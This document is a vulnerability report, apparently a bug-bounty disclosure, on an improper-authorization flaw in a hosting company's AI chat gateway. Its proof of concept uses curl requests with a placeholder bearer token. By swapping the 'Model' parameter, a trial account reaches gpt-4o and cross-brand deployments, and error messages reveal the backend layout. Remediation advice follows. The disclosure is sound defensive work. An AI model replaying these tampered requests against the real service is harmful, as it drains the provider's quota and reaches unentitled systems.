# Vulnerability Report: Improper Authorization in POST /ai-api/v3.0/chat allows Arbitrary Enterprise LLM Deployment Selection and Quota Exhaustion

## Executive Summary
The Newfold / OneWeb centralized AI Gateway (`api-gw.builderservices.io`) improperly delegates LLM model selection to the client application. An authenticated user with a standard zero-cost trial account can tamper with the `OpenAiChatOptions.Model` parameter in requests sent to `POST /ai-api/v3.0/chat` to force the backend to execute prompts against unentitled, high-cost enterprise Azure OpenAI deployments (such as `gpt-4o` and `gpt-4o-mini`), as well as cross-brand internal models (such as `netsol-help-gpt4.1-mini`).

This bypasses server-side authorization boundaries, allowing low-privilege accounts to consume enterprise LLM token quotas, induce resource exhaustion on production AI services, and enumerate backend cloud deployment topology via verbose upstream error messages.

---

## Vulnerability Details
- **Vulnerability Class:** CWE-285: Improper Authorization / OWASP Top 10 for LLM: LLM04 (Model Denial of Service & Resource Exhaustion) / LLM07 (System Information Leak)
- **Root Cause Category:** Access Control
- **Affected Asset / Endpoint:** `POST https://api-gw.builderservices.io/ai-api/v3.0/chat`
- **Application Context:** AI Assistant in Account Manager (`https://www.bluehost.com/my-account/hosting/details/sites`)
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H` (Base Score: 7.1 - High)

## Proof of Concept (PoC)

### Prerequisites
1. A standard Bluehost user account (reproducible on a zero-cost 14-day trial account).
2. An active session Bearer token (`scope: user-fe`), retrievable from the browser session storage or via `POST https://www.bluehost.com/sfcore.do?getJWTTokenV1`.

### Step-by-Step Reproduction

1. **Obtain an authenticated session token:**
   In the Bluehost Account Manager, the frontend receives a JWT for the `jarvis-jwt` issuer.

2. **Send a baseline request (intended behavior):**
   The intended client request specifies the tier-appropriate model (`bluehost-help-gpt4.1-mini`):

   ```bash
   curl -s -X POST "https://api-gw.builderservices.io/ai-api/v3.0/chat" \
     -H "Authorization: Bearer <USER_BEARER_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{
       "PromptId": "85756fc6-f4f0-4861-abae-645106d379b5",
       "SessionId": "988ee60f-5b82-4092-a3c5-93addd7ad7ef",
       "OpenAiChatOptions": {
         "Model": "bluehost-help-gpt4.1-mini",
         "hasAzureAiSearch": false,
         "HasCustomFunctions": false,
         "messages": [{"role": "user", "content": "Hello"}]
       }
     }'
   ```

   **Observed Response:**
   ```json
   {
     "transactionId": "75c61110-592e-4e79-81a0-d09c9d292015",
     "openAiResponse": {
       "deploymentName": "bluehost-help-gpt4.1-mini",
       "usage": { "prompt_tokens": 1695, "completion_tokens": 18, "total_tokens": 1713 }
     },
     "success": true
   }
   ```

3. **Tamper with the `Model` parameter to invoke `gpt-4o`:**
   Send the identical request, but modify `"Model"` to `"gpt-4o"`:

   ```bash
   curl -s -X POST "https://api-gw.builderservices.io/ai-api/v3.0/chat" \
     -H "Authorization: Bearer <USER_BEARER_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{
       "PromptId": "85756fc6-f4f0-4861-abae-645106d379b5",
       "SessionId": "988ee60f-5b82-4092-a3c5-93addd7ad7ef",
       "OpenAiChatOptions": {
         "Model": "gpt-4o",
         "hasAzureAiSearch": false,
         "HasCustomFunctions": false,
         "messages": [{"role": "user", "content": "What is WordPress hosting and what plans does Bluehost offer?"}]
       }
     }'
   ```

   **Observed Response:**
   ```json
   {
     "transactionId": "b0dda682-24d1-4691-8d22-087bf2152158",
     "openAiResponse": {
       "deploymentName": "gpt-4o",
       "usage": {
         "prompt_tokens": 949,
         "completion_tokens": 22,
         "total_tokens": 971
       }
     },
     "success": true
   }
   ```

4. **Verify Deployment Topology & Cross-Brand Routing:**
   - Setting `"Model": "netsol-help-gpt4.1-mini"` succeeds with HTTP 200 and routes directly to the Network Solutions internal model deployment.
   - Setting `"Model": "dall-e-3"` returns HTTP 200 with the verbatim Azure OpenAI upstream error:
     ```json
     {
       "openAiResponse": {
         "error": {
           "message": "Bad request for dependent service.",
           "type": "invalid_request_error",
           "code": "BadRequestForDependentService"
         },
         "deploymentName": "dall-e-3"
       },
       "success": false
     }
     ```
   - Setting an unregistered deployment name (e.g. `"test-model"`) returns HTTP 405 `{"message": "Invalid model", "success": false}`.

## Business Impact
1. **Financial Quota & Compute Exhaustion:** The `gpt-4o` model is an order of magnitude more expensive than the mini assistant models intended for self-service chat. Because rate limits are evaluated broadly per token/request (`x-ratelimit-remaining: 99`), an attacker can automate requests using enterprise `gpt-4o` models to consume organizational API budget and exhaust rate limits, leading to service degradation for legitimate users across the platform.
2. **Authorization Boundary Violation:** Unentitled users can interact with internal models intended strictly for higher-tier services or separate business brands (`netsol-help-gpt4.1-mini`).
3. **Backend Cloud Architecture Disclosure:** Verbatim error forwarding exposes Azure OpenAI deployment names, upstream connection states, and dependent service constraints.

## Suggested Remediation

1. **Remove Client-Controlled Model Parameter:**  
   The gateway should determine the target model server-side based on the authenticated user's entitlements, channel context (`mtChannelId`), and endpoint route, rather than trusting `OpenAiChatOptions.Model` from the client request body.

2. **Strict Whitelisting per Endpoint:**  
   If model selection is dynamically required internally, restrict the chat endpoint to only allow `bluehost-help-gpt4.1-mini` for Bluehost users. Disallow `gpt-4o`, `gpt-4o-mini`, `dall-e-3`, or cross-brand models on public user-facing chat routes.

3. **Sanitize Upstream Error Messages:**  
   Mask raw Azure OpenAI upstream error payloads (`BadRequestForDependentService`, internal deployment names) with generic client-safe error messages.
